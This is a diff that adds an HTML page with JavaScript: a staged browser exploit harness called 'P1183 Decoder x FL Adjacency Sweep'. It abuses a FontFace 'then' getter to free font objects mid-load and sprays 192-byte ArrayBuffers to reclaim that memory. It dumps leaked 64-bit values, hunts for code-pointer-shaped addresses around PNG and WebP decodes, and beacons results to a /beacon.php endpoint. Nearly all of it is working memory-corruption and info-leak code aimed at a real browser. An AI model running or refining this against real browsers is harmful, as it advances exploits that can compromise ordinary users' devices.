@@ -1,0 +1,240 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1183 Decoder x FL Adjacency Sweep</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#050508;color:#e8ffe8;font:14px/1.5 'Courier New',monospace;padding:12px}
+#hud{background:#0a0a18;border:2px solid #2a2a5a;border-radius:10px;padding:12px;margin-bottom:10px}
+#hud h1{color:#00ff88;font-size:18px;margin-bottom:6px}
+#status{font-size:20px;font-weight:bold;color:#ffd75e;padding:6px 0}
+#phase{font-size:16px;color:#00ffee}
+#counters{font-size:14px;color:#b9c6ee;line-height:1.8}
+#finds{font-size:14px;color:#ff55c8;line-height:1.7;white-space:pre-wrap;word-break:break-all}
+#log{background:#0a0a12;border:1px solid #22223a;border-radius:8px;padding:8px;margin-top:8px;
+max-height:40vh;overflow-y:auto;font-size:12px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head><body>
+<div id="hud">
+  <h1>P1183 — DECODER x FL ADJACENCY SWEEP</h1>
+  <div id="status">BOOTING...</div>
+  <div id="phase">phase: init</div>
+  <div id="counters">stage: ?</div>
+  <div id="finds">no findings yet</div>
+</div>
+<div id="log"></div>
+<script>
+'use strict';
+var L=document.getElementById('log'),S=document.getElementById('status'),
+PH=document.getElementById('phase'),CT=document.getElementById('counters'),FD=document.getElementById('finds');
+var T0=Date.now();
+function setStatus(t){S.textContent=t;}
+function setPhase(t){PH.textContent='phase: '+t;}
+function setCounters(t){CT.textContent=t;}
+function addFind(t){var d=document.createElement('div');d.textContent=t;FD.textContent='';FD.appendChild(d);}
+function log(m,c){var d=document.createElement('div');d.className=c||'';
+d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
+function B(tag,data){try{var u='/beacon.php?tag=P1183-'+encodeURIComponent(tag);
+if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+
+/* ═══════════════════════════════════════════════════════════════════════
+   P1183: decoder x FL adjacency. Image decoders churn fastMalloc; run
+   decodes around the FL leak window and re-scan the reclaimed 192B AB
+   for NEW fields / code-pointer-shaped values.
+   0: baseline FL leak (dump)
+   1: FL leak then PNG decode -> rescan (engine may write new fields)
+   2: PNG decode INSIDE the then-getter -> rescan
+   3: WebP decode + FL (if WebP export works)
+   4: 5x leak+decode cycles, collect ALL pointer values seen
+   ═══════════════════════════════════════════════════════════════════════ */
+
+var STAGES=['baseline','fl-png','png-in-getter','fl-webp','cycles'];
+var stage=0,results=[];
+try{stage=parseInt(localStorage.getItem('p1183_stage')||'0');}catch(e){}
+try{var r=localStorage.getItem('p1183_res');if(r)results=JSON.parse(r);}catch(e){}
+if(!Array.isArray(results))results=[];
+B('BOOT','stage='+stage+'|'+STAGES[stage]);
+setStatus('STAGE '+stage+'/4 — '+STAGES[stage]);
+
+if(stage>=STAGES.length){
+  setStatus('ALL DONE');
+  B('ALL-DONE',JSON.stringify(results).slice(0,800));
+  log('=== ALL DONE ===','ok');
+  try{localStorage.removeItem('p1183_stage');}catch(e){}
+}else{
+
+try{localStorage.setItem('p1183_stage',''+(stage+1));}catch(e){}
+var cur=STAGES[stage];
+
+function makePNGBlob(){
+  return new Promise(function(res){
+    var cv=document.createElement('canvas');cv.width=64;cv.height=64;
+    var cx=cv.getContext('2d');
+    cx.fillStyle='#3366cc';cx.fillRect(0,0,64,64);
+    try{cv.toBlob(function(b){res(b);},'image/png');}catch(e){res(null);}
+  });
+}
+function makeWebPBlob(){
+  return new Promise(function(res){
+    var cv=document.createElement('canvas');cv.width=64;cv.height=64;
+    var cx=cv.getContext('2d');
+    cx.fillStyle='#cc3366';cx.fillRect(0,0,64,64);
+    try{cv.toBlob(function(b){res(b);},'image/webp');}catch(e){res(null);}
+  });
+}
+function decodeBlob(blob){
+  return new Promise(function(res){
+    if(!blob){res(false);return;}
+    createImageBitmap(blob).then(function(bmp){res(true);},function(){res(false);});
+  });
+}
+
+function flLeak(cb,inGetter){
+  var done=false;
+  var watchdog=setTimeout(function(){if(done)return;done=true;cb(null);},6000);
+  function fin(p){if(done)return;done=true;clearTimeout(watchdog);
+    try{delete FontFace.prototype.then;}catch(e){}cb(p);}
+  try{
+    var fired=false,styleEl;
+    var A=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+    document.fonts.add(A);void A.loaded;
+    styleEl=document.createElement('style');
+    styleEl.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
+    document.head.appendChild(styleEl);
+    Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+      get:function(){
+        if(fired)return undefined;fired=true;
+        if(styleEl)styleEl.remove();
+        try{document.fonts.delete(this);}catch(e){}
+        document.body.offsetHeight;
+        window.__map=[];
+        for(var k=0;k<120;k++){var ab=new ArrayBuffer(192);
+          window.__map.push({view:new Uint8Array(ab)});}
+        if(inGetter){inGetter();}
+        try{document.fonts.check('1em s0');}catch(e){}
+        return undefined;
+      },set:function(){}});
+    document.fonts.load('1em f0, s0','AB');
+    setTimeout(function(){
+      var found=null;
+      for(var i=0;i<window.__map.length&&!found;i++){
+        var e=window.__map[i];
+        var nz=false;for(var b=0x58;b<0x60;b++)if(e.view[b])nz=true;
+        if(nz){found={ab:e.view.buffer};}
+      }
+      fin(found);
+    },80);
+  }catch(e){B('FL-ERR',e.message);fin(null);}
+}
+
+function dump(ab,label){
+  var dv=new DataView(ab);
+  var qws=[];
+  for(var off=0;off+7<192;off+=8){
+    var qw;try{qw=dv.getBigUint64(off,true);}catch(e){break;}
+    if(qw!==0n)qws.push('+'+off+'=0x'+qw.toString(16));
+  }
+  var rep=label+'|'+qws.join(',');
+  B('DUMP',rep.slice(0,700));
+  return qws;
+}
+function codeShaped(qws){
+  var hits=[];
+  for(var i=0;i<qws.length;i++){
+    var m=qws[i].match(/0x([0-9a-f]+)/);
+    if(!m)continue;
+    var h=m[1];
+    if(h.length===16&&h.slice(0,4)==='1000')hits.push(qws[i]);
+  }
+  return hits;
+}
+
+function done(rep){
+  results.push({stage:stage,name:cur,result:rep});
+  try{localStorage.setItem('p1183_res',JSON.stringify(results));}catch(e){}
+  B('RESULT',rep.slice(0,700));
+  addFind(cur+': '+rep.slice(0,300));
+  setStatus(rep.slice(0,80));
+  log('=== '+cur+' -> '+rep+' ===','ok');
+  B('NEXT');
+  setTimeout(function(){location.reload(true);},700);
+}
+
+if(cur==='baseline'){
+  setPhase('baseline FL leak');
+  flLeak(function(leak){
+    if(!leak){done('no-leak');return;}
+    done(dump(leak.ab,'base').join(','));
+  });
+}else if(cur==='fl-png'){
+  setPhase('FL then PNG decode');
+  flLeak(function(leak){
+    if(!leak){done('no-leak');return;}
+    makePNGBlob().then(function(blob){
+      decodeBlob(blob).then(function(ok){
+        var qws=dump(leak.ab,'fl-png');
+        var code=codeShaped(qws);
+        done('decoded='+ok+'|codeShaped='+code.length+'|'+qws.join(','));
+      });
+    });
+  });
+}else if(cur==='png-in-getter'){
+  setPhase('PNG decode inside getter');
+  var blobH=null;
+  makePNGBlob().then(function(blob){blobH=blob;});
+  flLeak(function(leak){
+    if(!leak){done('no-leak');return;}
+    var qws=dump(leak.ab,'in-getter');
+    done(qws.join(','));
+  },function(){ if(blobH)decodeBlob(blobH); });
+}else if(cur==='fl-webp'){
+  setPhase('FL then WebP decode');
+  flLeak(function(leak){
+    if(!leak){done('no-leak');return;}
+    makeWebPBlob().then(function(blob){
+      decodeBlob(blob).then(function(ok){
+        var qws=dump(leak.ab,'fl-webp');
+        done('decoded='+ok+'|'+qws.join(','));
+      });
+    });
+  });
+}else if(cur==='cycles'){
+  setPhase('5x cycles');
+  var c=0,all=[];
+  function cycle(){
+    if(c>=5){done('all='+all.slice(0,10).join(' ; '));return;}
+    c++;
+    flLeak(function(leak){
+      if(leak){
+        var qws=dump(leak.ab,'cyc'+c);
+        for(var i=0;i<qws.length;i++)if(all.indexOf(qws[i])<0)all.push(qws[i]);
+      }
+      setTimeout(cycle,300);
+    });
+  }
+  cycle();
+}
+
+} /* stage machine */
+
+/* auto-reload checker */
+(function(){
+  var cur='P1183-decoder-fl';
+  setTimeout(function check(){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/reload.txt?c='+Date.now(),true);
+      x.onload=function(){
+        var t=(x.responseText||'').trim();
+        if(t&&t!==cur){location.reload(true);return;}
+        setTimeout(check,3000);};
+      x.onerror=function(){setTimeout(check,5000);};
+      x.send();
+    }catch(e){setTimeout(check,5000);}
+  },4000);
+})();
+</script>
+</body></html>
